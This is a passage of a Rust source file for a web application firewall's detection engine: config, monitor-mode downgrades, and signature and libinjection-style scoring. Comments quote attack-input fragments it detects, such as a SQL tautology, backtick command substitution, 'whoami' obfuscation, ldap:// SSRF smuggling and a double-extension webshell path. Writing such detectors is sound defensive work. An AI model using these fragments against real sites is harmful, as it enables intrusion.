//! Main WAF detection engine.
//!
//! The engine is the single entry point used by the proxy / agent crates:
//!
//! ```ignore
//! let engine = WafEngine::new(&WafEngineConfig::default());
//! let verdict = engine.inspect(&request_data);
//! match verdict.action {
//!     WafAction::Block => return forbidden(),
//!     WafAction::Challenge => return challenge_page(),
//!     _ => forward_to_origin(),
//! }
//! ```
//!
//! Internally the engine runs the multi-stage pipeline documented on
//! [`WafEngine::inspect`].

use std::net::IpAddr;
use std::str::FromStr;
use std::time::Instant;

use pingwaf_profiler::{Method, Module, record_method, track_memory};
use serde::{Deserialize, Serialize};

use crate::normalize::ValueSource;
use crate::normalize::{normalize_request, NormalizedRequest};
use crate::rules::expression::{evaluate, EvalContext};
use crate::rules::managed::{default_managed_rules, managed_rule_category};
use crate::rules::signatures::{
    ci_backtick_interleaved, ci_chr_chain, crlf_header_injection_shaped,
    detect_deser_shape, detect_expr_injection, detect_js_call, detect_sqli,
    detect_xss, path_tautology_segment, pt_double_exec_extension,
    pt_remote_backslash_include, sqli_into_file_statement_shaped,
    sqli_tautology_statement_shaped, sqli_union_statement_shaped,
    ssrf_protocol_smuggling, tautology_sits_in_prose, xss_markup_shaped,
    xss_script_tag_shaped, xss_script_uri_html_shaped, AttackCategory,
    SignatureEngine, SignatureHit,
};
use crate::rules::{CompiledRule, RuleAction};
use crate::score::{AnomalyScorer, ScoreBreakdown, ScoreClass};
use crate::{CategorySet, StackSet, WafAction, WafLevel, WafVerdict};

/// Operating mode for the engine.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default,
)]
#[serde(rename_all = "snake_case")]
pub enum WafMode {
    /// Engine is disabled — every request returns `Pass` immediately.
    Off,
    /// Detect and log but never block. Verdicts are downgraded from
    /// `Block`/`Challenge` to `Monitor`.
    Monitor,
    /// Full enforcement.
    #[default]
    Block,
}

/// Static configuration used to build a [`WafEngine`].
#[derive(Debug, Clone)]
pub struct WafEngineConfig {
    pub mode: WafMode,
    /// Detection level. Normal keeps the low-false-positive defaults;
    /// Strict enables the escape-decoding pass, structural EL/SSTI
    /// detection, Strict-only needles and rules, tightened sub-score gates
    /// and paranoia-level-3 rules.
    pub level: WafLevel,
    /// Backend stacks deployed behind this engine. `GENERIC` patterns and
    /// rules are always active; language-scoped ones (Java deserialization,
    /// PHP unserialize, …) load only when their stack is listed. Defaults to
    /// every stack so unconfigured deployments keep full coverage.
    pub stacks: StackSet,
    /// Aggregate-score block threshold (default 40).
    pub threshold: u32,
    /// 1 (loose) … 4 (paranoid).
    pub paranoia_level: u8,
    /// Maximum URL-decoding passes (default 3).
    pub max_decode_layers: usize,
    /// User-supplied rules; combined with managed defaults when
    /// `enable_managed_rules` is true.
    pub rules: Vec<CompiledRule>,
    pub enable_managed_rules: bool,
    /// When `true`, a Stage-1 critical hit short-circuits to an immediate
    /// Block verdict without running the rule engine.
    pub fast_path_block_on_critical: bool,
    /// Attack categories downgraded to monitor-only. Hits in these
    /// categories are still detected and scored into the aggregate (for
    /// logging / Monitor verdicts) but can never block. Empty = enforce
    /// everything.
    pub monitor_categories: CategorySet,
    /// Backend stacks downgraded to monitor-only, same semantics as
    /// `monitor_categories`. `GENERIC`-only patterns are never downgraded.
    pub monitor_stacks: StackSet,
    /// Individual managed rules (by id, e.g. `PINGWAF-1010`) downgraded to
    /// monitor-only. Same semantics as the category/stack sets but scoped to
    /// one rule; score-gate rules downgrade too (their Block verdict becomes
    /// Monitor while the hit still feeds the total score). Empty = enforce
    /// everything.
    pub monitor_managed_rules: std::collections::HashSet<String>,
    /// Built-in managed rules switched `off` by a site-level
    /// `RuleOverride` (`enabled = false`; the control plane also emits one for
    /// a built-in rule whose `mode` is `off`). Disabled rules are removed
    /// before compilation: they are never evaluated, never scored and never
    /// logged. `RuleOverride` cannot express `monitor` — that downgrade stays
    /// on `monitor_managed_rules`. Empty = keep every managed rule.
    pub disabled_managed_rules: std::collections::HashSet<String>,
    /// Custom rule ids downgraded to monitor-only: a hit feeds the anomaly
    /// score and the event log but the rule's own action never enforces.
    /// This carries the per-rule monitor switch from the control plane —
    /// unlike managed rules, a custom rule's id never starts with
    /// `PINGWAF-`, so membership here is the only downgrade source.
    pub monitor_custom_rules: std::collections::HashSet<String>,
}

impl Default for WafEngineConfig {
    fn default() -> Self {
        Self {
            mode: WafMode::Block,
            level: WafLevel::Normal,
            stacks: StackSet::ALL,
            threshold: 40,
            paranoia_level: 2,
            max_decode_layers: 3,
            rules: Vec::new(),
            enable_managed_rules: true,
            fast_path_block_on_critical: true,
            monitor_categories: CategorySet::EMPTY,
            monitor_stacks: StackSet::EMPTY,
            monitor_managed_rules: std::collections::HashSet::new(),
            disabled_managed_rules: std::collections::HashSet::new(),
            monitor_custom_rules: std::collections::HashSet::new(),
        }
    }
}

/// Input data for a single inspection.
#[derive(Debug, Clone)]
pub struct RequestData {
    pub method: String,
    pub path: String,
    /// Raw query string (without the leading `?`).
    pub query: String,
    /// Header pairs in wire order; names will be lower-cased internally.
    pub headers: Vec<(String, String)>,
    pub body: Option<Vec<u8>>,
    pub client_ip: String,
    /// Optional GeoIP country code (ISO-3166 alpha-2).
    pub country_code: Option<String>,
    /// `"http"` or `"https"`.
    pub scheme: String,
    /// Wire protocol, e.g. `"HTTP/1.1"` or `"HTTP/2.0"`.
    pub protocol: String,
}

impl RequestData {
    pub fn new(method: impl Into<String>, path: impl Into<String>) -> Self {
        Self {
            method: method.into(),
            path: path.into(),
            query: String::new(),
            headers: Vec::new(),
            body: None,
            client_ip: String::new(),
            country_code: None,
            scheme: "http".into(),
            protocol: "HTTP/1.1".into(),
        }
    }
}

/// The part of the request a hit was found in, as reported to the event log
/// (D17). Coarser than [`ValueSource`]: a cookie is a header on the wire and
/// an event reader asks "where did it land?", not which parser split it, so
/// `QueryParam` and `Cookie` collapse into `Query`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Surface {
    Query,
    Header,
    Body,
    Path,
}

impl Surface {
    /// Stable wire name used in `waf_details` (`surface=` / `surfaces=`).
    pub fn as_str(self) -> &'static str {
        match self {
            Surface::Query => "query",
            Surface::Header => "header",
            Surface::Body => "body",
            Surface::Path => "path",
        }
    }

    fn of(source: ValueSource) -> Self {
        match source {
            ValueSource::QueryParam | ValueSource::Cookie => Surface::Query,
            ValueSource::Header => Surface::Header,
            ValueSource::Body => Surface::Body,
            ValueSource::Path => Surface::Path,
        }
    }
}

/// First surface to report for a verdict, in reading order. `None` only when
/// nothing was recorded (a pure Stage-2 rule match on request metadata the
/// Stage-1 values do not cover), in which case no marker is emitted.
fn first_surface(surfaces: &[Surface]) -> Option<Surface> {
    [
        Surface::Query,
        Surface::Header,
        Surface::Body,
        Surface::Path,
    ]
    .into_iter()
    .find(|candidate| surfaces.contains(candidate))
}

/// `[query]` / `[query,body]` marker for the verdict details. The surfaces are
/// fixed vocabulary words — never request content — so the marker cannot leak
/// data or rule internals.
fn surfaces_marker(surfaces: &[Surface]) -> Option<String> {
    let mut unique: Vec<Surface> = surfaces.to_vec();
    unique.sort_unstable();
    unique.dedup();
    if unique.is_empty() {
        return None;
    }
    let names: Vec<&str> = unique.iter().map(|s| s.as_str()).collect();
    Some(format!("[{}]", names.join(",")))
}

/// Deferred Stage-1 hit record. Scoring happens inline while the value is
/// hot, but the human-readable strings are only materialized when the verdict
/// turns out to be something other than a clean pass — the overwhelmingly
/// common case pays zero formatting cost.
enum HitRec<'a> {
    /// Aho-Corasick signature hit; metadata resolved through the engine's
    /// pattern table at string-build time.
    Sig {
        pattern: u32,
        severity: u8,
        source: &'static str,
        name: &'a str,
        /// Downgraded to monitor-only by the per-site monitor sets.
        monitored: bool,
    },
    /// libinjection-style detector hit. The severity is applied to the
    /// scorer inline; the record only carries what string-building needs.
    Lib {
        kind: &'static str,
        fingerprint: String,
        source: &'static str,
        name: &'a str,
        monitored: bool,
    },
    /// Structural expression-injection hit (Strict level only).
    Expr {
        container: &'static str,
        source: &'static str,
        name: &'a str,
        monitored: bool,
    },
}

/// Name of an enforcement action as it appears in verdict details. Mirrors
/// `WafAction` without widening the crate's public API.
fn enforce_action_str(action: WafAction) -> &'static str {
    match action {
        WafAction::Pass => "pass",
        WafAction::Monitor => "monitor",
        WafAction::Block => "block",
        WafAction::Challenge => "challenge",
    }
}

/// A Stage-2 rule match, recorded by reference and stringified only when the
/// verdict needs details.
struct RuleRec<'a> {
    id: &'a str,
    name: &'a str,
    action: RuleAction,
    severity: u8,
    monitored: bool,
}

/// Multi-stage WAF detection engine. Clone is intentionally not derived —
/// share an `Arc<WafEngine>` instead so the Aho-Corasick automaton stays put.
/// A typed body field (form member / JSON member) above this decoded length
/// is treated as pasted bulk content — code, documents, uploaded HTML — and
/// weighted like a blob. Real injection payloads are short; pasted content
/// routinely carries the same markers (`<script>`, quote+keyword runs,
/// CRLF) as attacks.
const FIELD_STRONG_MAX_LEN: usize = 256;

pub struct WafEngine {
    signatures: SignatureEngine,
    rules: Vec<CompiledRule>,
    scorer: AnomalyScorer,
    mode: WafMode,
    level: WafLevel,
    stacks: StackSet,
    max_decode_layers: usize,
    fast_path_block_on_critical: bool,
    monitor_categories: CategorySet,
    monitor_stacks: StackSet,
    monitor_managed_rules: std::collections::HashSet<String>,
    monitor_custom_rules: std::collections::HashSet<String>,
}

impl std::fmt::Debug for WafEngine {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("WafEngine")
            .field("mode", &self.mode)
            .field("level", &self.level)
            .field("stacks", &self.stacks.bits())
            .field("rule_count", &self.rules.len())
            .field("signature_count", &self.signatures.pattern_count())
            .field("scorer", &self.scorer)
            .finish()
    }
}

impl Default for WafEngine {
    fn default() -> Self {
        Self::new(&WafEngineConfig::default())
    }
}

impl WafEngine {
    pub fn new(config: &WafEngineConfig) -> Self {
        let mut rules = Vec::with_capacity(config.rules.len() + 16);
        if config.enable_managed_rules {
            rules.extend(default_managed_rules(config.level));
        }
        // Site-level `RuleOverride` off: the rule is not compiled, not
        // evaluated and never produces an event or score. Removal happens
        // before any request ever sees the engine, so `rule_monitored` does
        // not need an off branch. Custom rules cannot match the
        // `PINGWAF-` guard and are left untouched.
        if !config.disabled_managed_rules.is_empty() {
            rules.retain(|r| {
                !r.id.starts_with("PINGWAF-")
                    || !config.disabled_managed_rules.contains(r.id.as_str())
            });
        }
        rules.extend(config.rules.iter().cloned());

        Self {
            signatures: SignatureEngine::for_profile(
                config.level,
                config.stacks,
            ),
            rules,
            scorer: AnomalyScorer::new(config.threshold, config.paranoia_level),
            mode: config.mode,
            level: config.level,
            stacks: config.stacks,
            max_decode_layers: config.max_decode_layers.clamp(1, 5),
            fast_path_block_on_critical: config.fast_path_block_on_critical,
            monitor_categories: config.monitor_categories,
            monitor_stacks: config.monitor_stacks,
            monitor_managed_rules: config.monitor_managed_rules.clone(),
            monitor_custom_rules: config.monitor_custom_rules.clone(),
        }
    }

    /// `true` when a Stage-1 hit in `category` / `stack` is downgraded to
    /// monitor-only by the per-site monitor sets. `GENERIC`-only stacks are
    /// never stack-downgraded — a language-agnostic payload cannot be
    /// attributed to a disabled backend.
    fn hit_monitored(&self, category: AttackCategory, stack: StackSet) -> bool {
        if self.monitor_categories.contains_category(category) {
            return true;
        }
        let scoped = stack.except_generic();
        !scoped.is_empty() && self.monitor_stacks.intersects(scoped)
    }

    /// `true` when a Stage-2 rule is downgraded to monitor-only. Managed
    /// rules downgrade through the category/stack/per-rule sets; custom
    /// rules only through the explicit per-rule monitor set (the control
    /// plane's per-rule monitor switch), never implicitly.
    fn rule_monitored(&self, rule: &CompiledRule) -> bool {
        if !rule.id.starts_with("PINGWAF-") {
            return self.monitor_custom_rules.contains(rule.id.as_str());
        }
        if self.monitor_managed_rules.contains(rule.id.as_str()) {
            return true;
        }
        match managed_rule_category(rule) {
            Some(category) => {
                self.monitor_categories.contains_category(category)
                    || (rule.stacks.except_generic().bits() != 0
                        && self.monitor_stacks.intersects(rule.stacks))
            },
            None => false,
        }
    }

    /// Paranoia level actually used for rule gating. The Strict level implies
    /// at least PL3, so the size/empty-UA rules activate without the operator
    /// having to touch the knob.
    fn effective_paranoia(&self) -> u8 {
        if self.level.is_strict() {
            self.scorer.paranoia_level.max(3)
        } else {
            self.scorer.paranoia_level
        }
    }

    /// Hot-reload the user rule set. Managed defaults are preserved.
    pub fn update_rules(&mut self, user_rules: Vec<CompiledRule>) {
        let managed: Vec<CompiledRule> = self
            .rules
            .drain(..)
            .filter(|r| r.id.starts_with("PINGWAF-"))
            .collect();
        self.rules = managed;
        self.rules.extend(user_rules);
    }

    /// Replace the entire rule set, including managed defaults.
    pub fn replace_all_rules(&mut self, rules: Vec<CompiledRule>) {
        self.rules = rules;
    }

    pub fn set_mode(&mut self, mode: WafMode) {
        self.mode = mode;
    }

    pub fn mode(&self) -> WafMode {
        self.mode
    }

    pub fn set_threshold(&mut self, threshold: u32) {
        self.scorer.threshold = threshold.max(1);
    }

    pub fn set_paranoia_level(&mut self, level: u8) {
        self.scorer.paranoia_level = level.clamp(1, 4);
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Main inspection entry point.
    ///
    /// Pipeline:
    /// 1. Normalize the request (URL multi-decode, HTML entity decode, path
    ///    collapse, query/cookie split; escape-sequence decoding at Strict).
    /// 2. Stage 1 — Aho-Corasick signature scan + libinjection SQLi/XSS over
    ///    every decoded value. Each hit feeds the anomaly scorer. Referer /
    ///    User-Agent hits in the reflected families (SQLi / XSS / RCE) are
    ///    demoted to weak signals; the Strict level promotes the
    ///    high-confidence injection families to critical and adds structural
    ///    expression-injection detection.
    /// 3. If `fast_path_block_on_critical` and a critical hit landed,
    ///    short-circuit to a Block verdict without running Stage 2.
    /// 4. Stage 2 — evaluate compiled rules against an [`EvalContext`] that
    ///    already exposes the Stage-1 sub-scores. Allow actions short-circuit
    ///    the rest of the rule set.
    /// 5. Combine the aggregate score with the engine threshold and mode to
    ///    pick the final action. Hit strings are only materialized when the
    ///    verdict is something other than a clean pass, so the happy path
    ///    pays zero formatting cost.
    ///
    /// Under `WafMode::Monitor` a `Block`/`Challenge` verdict is downgraded to
    /// `Monitor` — that behaviour is the whole point of the mode. The verdict
    /// keeps the *original* action visible in `details`
    /// (`downgraded=true would_enforce=block cause=site-mode-monitor`) so the
    /// event log distinguishes "a block rule was suppressed" from "a rule
    /// configured to log fired".
    pub fn inspect(&self, request: &RequestData) -> WafVerdict {
        if self.mode == WafMode::Off {
            return WafVerdict::pass();
        }

        let normalize_started = Instant::now();
        let normalized = normalize_request(
            &request.method,
            &request.path,
            &request.query,
            &request.headers,
            request.body.as_deref(),
            self.max_decode_layers,
            self.level.is_strict(),
        );
        record_method(
            Method::WafNormalize,
            normalize_started.elapsed().as_nanos() as u64,
        );
        // The decoded values are the biggest structure the inspection builds;
        // report what they hold for as long as this inspection owns them.
        let decoded_bytes: usize = normalized
            .decoded_values
            .iter()
            .map(|value| value.decoded.len())
            .sum();
        let _normalized_memory =
            track_memory(Module::WafNormalize, decoded_bytes as u64);
        let paranoia = self.effective_paranoia();

        let mut breakdown = ScoreBreakdown::clean();
        let mut recs: Vec<HitRec> = Vec::new();
        // Every surface a recorded hit came from, in first-seen order; the
        // verdict details name the first one and aggregate the rest (D17).
        let mut surfaces: Vec<Surface> = Vec::new();
        let mut critical_hit = false;

        // Reused scan buffers: a full request costs one allocation here
        // instead of one per inspected value.
        let mut hits: Vec<SignatureHit> = Vec::new();
        let mut seen: Vec<u32> = Vec::new();

        // ----- Stage 1: signatures + libinjection over every decoded value -----
        let stage1_started = Instant::now();
        for value in &normalized.decoded_values {
            let needle = value.decoded.as_str();
            if needle.is_empty() {
                continue;
            }
            // Reflected display metadata (Referer / User-Agent) is not an
            // execution surface the way query/body/cookie values are: real
            // SQLi lands in fields the backend feeds to an interpreter,
            // while a Referer quoting "union select" is overwhelmingly
            // search-result noise. Demote those two headers to weak signals
            // for the reflected families — structural backend-parsing
            // families (Log4Shell, XXE, deserialization) keep full severity
            // because a JVM parses *every* header it receives.
            let is_meta_header = value.source == ValueSource::Header
                && (value.name.eq_ignore_ascii_case("referer")
                    || value.name.eq_ignore_ascii_case("user-agent"))
                && !xss_markup_shaped(needle);

            self.signatures.scan_into(needle, &mut hits, &mut seen);
            // A CRLF hit is only response-splitting material on its own
            // surface shape; on strict it also escalates when the same value
            // carries an injection-family companion — that combination is
            // real CRLF-injection traffic (command / traversal / SSRF
            // payload smuggled past the line break), while multi-line log
            // or telemetry text has none.
            let injection_company = self.level.is_strict()
                && hits.iter().any(|h| {
                    matches!(
                        h.category,
                        AttackCategory::CommandInjection
                            | AttackCategory::PathTraversal
                            | AttackCategory::Deserialization
                            | AttackCategory::Ssrf
                    )
                });
            for hit in &hits {
                let mut severity = hit.severity;
                let mut critical = severity >= 5;
                // Per-site monitor downgrade: hits in monitored categories /
                // stacks keep scoring into the aggregate but never into the
                // blocking subset, and never trip the critical fast path.
                let monitored = self.hit_monitored(
                    hit.category,
                    self.signatures.pattern(hit.pattern).stack,
                );
                let reflected_family = matches!(
                    hit.category,
                    AttackCategory::SqlInjection
                        | AttackCategory::Xss
                        | AttackCategory::CommandInjection
                );
                // Weak signals still feed the family sub-scores (three
                // distinct weak features crossing a gate is the P0-tested
                // blocking path for payloads reflected into Referer/UA),
                // but at demoted severity so a single value cannot one-shot.
                let pid = self.signatures.pattern_id(hit.pattern);
                // A script-URI inside a body value without tag structure is
                // collected markup — beacons re-serialize DOM attributes
                // ("javascript: void(0)") verbatim as JSON, and the JSON
                // unpacking surfaces them as plain `href` members. It is
                // skipped entirely (zero score, like the SQL search-phrase
                // rule): mirrors across blob and unpacked members must not
                // pile weak features onto the XSS family gate. On
                // URL-facing surfaces (query / cookie / headers) a bare
                // script URI stays critical: `?url=javascript:…` is a real
                // reflected-XSS shape. Same gate on every level — a
                // body-borne `javascript:` without tag context cannot
                // execute in any of the shapes it actually appears in. An
                // unclosed `<script` (search prose quoting the word) is
                // likewise zero value on every surface.
                let collected_js_uri = (pid == "XSS-007"
                    && value.source == ValueSource::Body
                    && !xss_script_uri_html_shaped(needle))
                    || (pid == "XSS-001"
                        && !xss_script_tag_shaped(
                            needle,
                            value.source != ValueSource::Body,
                        ));
                let weak = (is_meta_header && reflected_family)
                    || (value.source == ValueSource::Body
                        && (!value.field
                            || (value.decoded.len() > FIELD_STRONG_MAX_LEN
                                && !self.level.is_strict()))
                        && reflected_family);
                // A bare "union select" without statement structure is a
                // search phrase: the needle and its libinjection twin
                // describe the same string, so neither scores — zero value,
                // mirrored across query/Referer/body or not. Level-
                // independent: `?bq=union select …` search phrases exist on
                // every tier and are not injections on any of them.
                let search_phrase = (matches!(pid, "SQL-001" | "SQL-002")
                    && !sqli_union_statement_shaped(needle))
                    || (matches!(pid, "SQL-008" | "SQL-009")
                        && !sqli_into_file_statement_shaped(needle))
                    || collected_js_uri;
                if weak {
                    severity = severity.min(2);
                    critical = false;
                } else if hit.category == AttackCategory::CrlfInjection
                    && ((value.source != ValueSource::Body
                        && crlf_header_injection_shaped(needle))
                        || injection_company)
                {
                    // `…\r\nX-Foo:` is response-splitting material on any
                    // surface except a body blob; bare multi-line text (a
                    // multi-line form input echoed into a query, prose) is
                    // not — CRLF-003/004 carry their own header shape at
                    // sev5 and stay critical via `severity >= 5` above.
                    // On strict, a same-value injection-family companion
                    // (command / traversal / SSRF / deser payload smuggled
                    // past the line break) restores the critical call that
                    // the blanket-body demotion gave up.
                    critical = true;
                } else if self.level.is_strict()
                    && value.source != ValueSource::Path
                    && matches!(
                        hit.category,
                        AttackCategory::CommandInjection
                            | AttackCategory::Deserialization
                    )
                {
                    // High-confidence injection families block outright at
                    // the Strict level instead of waiting for the scorer —
                    // but only off the path surface. Bare multi-line text
                    // in a body (`…\r\n` in log payloads) is far too common
                    // for a blanket CRLF escalation, and path matrix
                    // parameters (`/foo;cat=…`) are storage URL grammar,
                    // not a shell; the path-source hits also stay out of
                    // the RCE sub-score below.
                    critical = true;
                }
                if critical && !search_phrase && !monitored {
                    critical_hit = true;
                }
                if !search_phrase {
                    if value.source == ValueSource::Path
                        && matches!(
                            hit.category,
                            AttackCategory::CommandInjection
                                | AttackCategory::Deserialization
                        )
                    {
                        // A command shape inside the path itself never
                        // reaches a shell — `;cat` is matrix-parameter
                        // grammar on storage URLs. The hit keeps its
                        // aggregate score but stays out of the RCE
                        // sub-score, or PINGWAF-1061 blocks benign
                        // storage-style paths at Strict.
                        self.scorer.add_severity_hit_ex(
                            &mut breakdown,
                            severity,
                            monitored,
                        );
                        recs.push(HitRec::Sig {
                            pattern: hit.pattern,
                            severity,
                            source: value.source.as_str(),
                            name: &value.name,
                            monitored,
                        });
                        surfaces.push(Surface::of(value.source));
                        continue;
                    }
                    self.scorer.add_category_hit_ex(
                        &mut breakdown,
                        hit.category,
                        severity,
                        monitored,
                    );
                    recs.push(HitRec::Sig {
                        pattern: hit.pattern,
                        severity,
                        source: value.source.as_str(),
                        name: &value.name,
                        monitored,
                    });
                    surfaces.push(Surface::of(value.source));
                }
            }

            // libinjection-style detectors on user-controlled values only.
            // Path/method/header-name are not attacker-typed strings the same
            // way query / body / cookie values are.
            if value.source == ValueSource::Path
                && path_tautology_segment(needle)
            {
                let monitored = self.hit_monitored(
                    AttackCategory::SqlInjection,
                    StackSet::GENERIC,
                );
                if !monitored {
                    critical_hit = true;
                }
                self.scorer.add_category_hit_ex(
                    &mut breakdown,
                    AttackCategory::SqlInjection,
                    5,
                    monitored,
                );
                recs.push(HitRec::Lib {
                    kind: "libinjection-sqli",
                    fingerprint: "path-segment-tautology".to_string(),
                    source: value.source.as_str(),
                    name: &value.name,
                    monitored,
                });
                surfaces.push(Surface::of(value.source));
            }
            // Raw backticks inside the path (`/ax--exec=`id`--remote`): URL
            // content never carries them unescaped, so a pair of them frames
            // a command substitution written by an attack tool.
            if value.source == ValueSource::Path
                && needle.matches('`').count() >= 2
            {
                let monitored = self.hit_monitored(
                    AttackCategory::CommandInjection,
                    StackSet::GENERIC,
                );
                if !monitored {
                    critical_hit = true;
                }
                self.scorer.add_category_hit_ex(
                    &mut breakdown,
                    AttackCategory::CommandInjection,
                    5,
                    monitored,
                );
                recs.push(HitRec::Lib {
                    kind: "ci-shape",
                    fingerprint: "path-backticks".to_string(),
                    source: value.source.as_str(),
                    name: &value.name,
                    monitored,
                });
                surfaces.push(Surface::of(value.source));
            }
            // Double executable extension at the path tail
            // (`/uploadfiles/apache.php.jpeg`): multi-extension parser abuse
            // prepping a webshell — the image suffix is camouflage.
            if value.source == ValueSource::Path
                && pt_double_exec_extension(&value.decoded)
            {
                let monitored = self.hit_monitored(
                    AttackCategory::PathTraversal,
                    StackSet::GENERIC,
                );
                if !monitored {
                    critical_hit = true;
                }
                self.scorer.add_category_hit_ex(
                    &mut breakdown,
                    AttackCategory::PathTraversal,
                    5,
                    monitored,
                );
                recs.push(HitRec::Lib {
                    kind: "pt-shape",
                    fingerprint: "double-exec-extension".to_string(),
                    source: value.source.as_str(),
                    name: &value.name,
                    monitored,
                });
                surfaces.push(Surface::of(value.source));
            }
            if !matches!(
                value.source,
                ValueSource::QueryParam
                    | ValueSource::Cookie
                    | ValueSource::Body
                    | ValueSource::Header
            ) {
                continue;
            }
            let (is_sqli, sqli_fp) = detect_sqli(needle);
            if is_sqli {
                let weak = is_meta_header
                    || (value.source == ValueSource::Body
                        && (!value.field
                            || (value.decoded.len() > FIELD_STRONG_MAX_LEN
                                && !self.level.is_strict())));
                // Same zero-score rule as the needle gate: a union-select
                // or into-file fingerprint without statement structure is
                // a search phrase, and the needle hit for it is skipped
                // as well. For tautology the discriminator is prose rather
                // than length: a long value that breaks a quote in front of
                // the operator, or carries SQL punctuation a sentence does
                // not use, is a probe however long it is. Length alone used
                // to decide, and padding `1' OR '1'='1` past 32 bytes — which
                // costs an attacker nothing — turned it into a "search
                // phrase" that scored zero. Long quote-keyword attacks carry
                // a UNION clause that has its own gate.
                let search_phrase = (sqli_fp.contains("union-select")
                    && !sqli_union_statement_shaped(needle))
                    || (sqli_fp.contains("into-file")
                        && !sqli_into_file_statement_shaped(needle))
                    || (sqli_fp.contains("tautology")
                        && needle.len() > 32
                        && !sqli_fp.contains("comment-terminator")
                        && !sqli_tautology_statement_shaped(needle)
                        && tautology_sits_in_prose(needle))
                    || (sqli_fp.contains("quote-keyword")
                        && needle.len() > 256);
                let (severity, critical) =
                    if weak { (2, false) } else { (5, true) };
                let monitored = self.hit_monitored(
                    AttackCategory::SqlInjection,
                    StackSet::GENERIC,
                );
                if critical && !search_phrase && !monitored {
                    critical_hit = true;
                }
                if !search_phrase {
                    self.scorer.add_category_hit_ex(
                        &mut breakdown,
                        AttackCategory::SqlInjection,
                        severity,
                        monitored,
                    );
                    recs.push(HitRec::Lib {
                        kind: "libinjection-sqli",
                        fingerprint: sqli_fp,
                        source: value.source.as_str(),
                        name: &value.name,
                        monitored,
                    });
                    surfaces.push(Surface::of(value.source));
                }
            }
            let (is_xss, xss_fp) = detect_xss(needle);
            if is_xss {
                // Mirrors the needle gate: a js-uri fingerprint on body
                // markup without tag structure is collected data — skipped
                // entirely, and the needle hit for it is skipped as well.
                // A script-tag fingerprint over an unclosed `<script` is
                // prose quoting the word.
                let collected_js_uri = (xss_fp.contains("js-uri")
                    && value.source == ValueSource::Body
                    && !xss_script_uri_html_shaped(needle))
                    || (xss_fp.contains("script-tag")
                        && !xss_script_tag_shaped(
                            needle,
                            value.source != ValueSource::Body,
                        ));
                let weak = is_meta_header
                    || (value.source == ValueSource::Body
                        && (!value.field
                            || (value.decoded.len() > FIELD_STRONG_MAX_LEN
                                && !self.level.is_strict())));
                let (severity, critical) =
                    if weak { (2, false) } else { (5, true) };
                let monitored =
                    self.hit_monitored(AttackCategory::Xss, StackSet::GENERIC);
                if critical && !collected_js_uri && !monitored {
                    critical_hit = true;
                }
                if !collected_js_uri {
                    self.scorer.add_category_hit_ex(
                        &mut breakdown,
                        AttackCategory::Xss,
                        severity,
                        monitored,
                    );
                    recs.push(HitRec::Lib {
                        kind: "libinjection-xss",
                        fingerprint: xss_fp,
                        source: value.source.as_str(),
                        name: &value.name,
                        monitored,
                    });
                    surfaces.push(Surface::of(value.source));
                }
            }

            // Structural PHP-serialization / OGNL shapes: no single literal,
            // so they live beside the libinjection detectors. Weak signals
            // (meta headers, body blobs, oversized values) score instead of
            // blocking; Strict treats any such shape as a critical hit —
            // these shapes are only produced by serializers and expression
            // interpreters, which are exactly the surfaces being attacked.
            if let Some(shape) = detect_deser_shape(needle) {
                let weak = is_meta_header
                    || (value.source == ValueSource::Body
                        && (!value.field
                            || value.decoded.len() > FIELD_STRONG_MAX_LEN)
                        && !self.level.is_strict());
                let (severity, critical) = if weak {
                    (2, false)
                } else if self.level.is_strict() {
                    (5, true)
                } else {
                    (4, false)
                };
                let monitored = self.hit_monitored(
                    AttackCategory::Deserialization,
                    StackSet::GENERIC,
                );
                if critical && !monitored {
                    critical_hit = true;
                }
                self.scorer.add_category_hit_ex(
                    &mut breakdown,
                    AttackCategory::Deserialization,
                    severity,
                    monitored,
                );
                recs.push(HitRec::Lib {
                    kind: "deser-shape",
                    fingerprint: shape.to_string(),
                    source: value.source.as_str(),
                    name: &value.name,
                    monitored,
                });
                surfaces.push(Surface::of(value.source));
            }

            // Exploit-only shape compositions, each a critical with no
            // honest counterpart: a shell command interleaved with an empty
            // backtick pair (`;wh``oami`), an SSRF-exploit scheme carrying a
            // framed newline (`ldap://…%0astats`), and a scheme prefix glued
            // to backslash traversal (`dir=http\..\admin\…`).
            if ci_backtick_interleaved(needle) {
                let monitored = self.hit_monitored(
                    AttackCategory::CommandInjection,
                    StackSet::GENERIC,
                );
                if !monitored {
                    critical_hit = true;
                }
                self.scorer.add_category_hit_ex(
                    &mut breakdown,
                    AttackCategory::CommandInjection,
                    5,
                    monitored,
                );
                recs.push(HitRec::Lib {
                    kind: "ci-shape",
                    fingerprint: "backtick-interleaved".to_string(),
                    source: value.source.as_str(),
                    name: &value.name,
                    monitored,
                });
                surfaces.push(Surface::of(value.source));
            }
            if ci_chr_chain(needle) {
                let monitored = self.hit_monitored(
                    AttackCategory::CommandInjection,
                    StackSet::GENERIC,
                );
                if !monitored {
                    critical_hit = true;
                }
                self.scorer.add_category_hit_ex(
                    &mut breakdown,
                    AttackCategory::CommandInjection,
                    5,
                    monitored,
                );
                recs.push(HitRec::Lib {
                    kind: "ci-shape",
                    fingerprint: "chr-codepoint-chain".to_string(),
                    source: value.source.as_str(),
                    name: &value.name,
                    monitored,
                });
                surfaces.push(Surface::of(value.source));
            }
            if ssrf_protocol_smuggling(needle) {
                let monitored =
                    self.hit_monitored(AttackCategory::Ssrf, StackSet::GENERIC);
                if !monitored {
                    critical_hit = true;
                }
                self.scorer.add_category_hit_ex(
                    &mut breakdown,
                    AttackCategory::Ssrf,
                    5,
                    monitored,
                );
                recs.push(HitRec::Lib {
                    kind: "ssrf-shape",
                    fingerprint: "protocol-smuggling".to_string(),
                    source: value.source.as_str(),
                    name: &value.name,
                    monitored,
                });
                surfaces.push(Surface::of(value.source));
            }
            if pt_remote_backslash_include(needle) {
                let monitored = self.hit_monitored(
                    AttackCategory::PathTraversal,
                    StackSet::GENERIC,
                );
                if !monitored {
                    critical_hit = true;
                }
                self.scorer.add_category_hit_ex(
                    &mut breakdown,
                    AttackCategory::PathTraversal,
                    5,
                    monitored,
                );
                recs.push(HitRec::Lib {
                    kind: "pt-shape",
                    fingerprint: "remote-backslash-include".to_string(),
                    source: value.source.as_str(),
                    name: &value.name,
                    monitored,
                });
                surfaces.push(Surface::of(value.source));
            }

            // Strict level: structural EL / SSTI detection over the decoded
